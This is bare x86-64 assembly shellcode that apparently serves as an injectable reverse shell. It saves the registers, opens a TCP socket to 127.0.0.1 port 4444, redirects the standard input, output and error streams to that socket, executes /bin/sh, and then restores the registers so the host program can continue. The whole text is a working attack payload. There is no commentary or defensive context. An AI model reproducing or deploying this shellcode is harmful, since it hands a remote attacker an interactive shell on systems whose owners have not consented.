    push rax
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    push rbp
    push r8
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14
    push r15

mov rax, 41
mov rdi, 0x02
mov rsi, 0x01
mov rdx, 0x06
syscall
push rax

movabs rcx, 0x100007f5c110002 
push   rcx                    
mov    rsi, rsp
mov    rdi, 3
push   0x10                   
pop    rdx                   
push   0x2a                    
pop    rax                    
syscall

test rax,rax
jnz no

pop rax

mov rax, 33
pop rdi
push rdi 
mov rsi, 0
syscall

mov rax, 33
pop rdi
push rdi 
mov rsi, 1
syscall

mov rax, 33
pop rdi
push rdi 
mov rsi, 2
syscall

movabs rbx,0x68732f6e69622f 
push rbx

mov rax, 59
mov rdi , rsp
xor rsi, rsi 
xor rdx, rdx
syscall

no:

pop rax
pop rax
xor rax, rax

pop r15
pop r14
pop r13
pop r12
pop r11
pop r10
pop r9
pop r8
pop rbp
pop rdi
pop rsi
pop rdx
pop rcx
pop rbx
pop rax

;mov rax, 3
;mov rdi ,3
;syscall


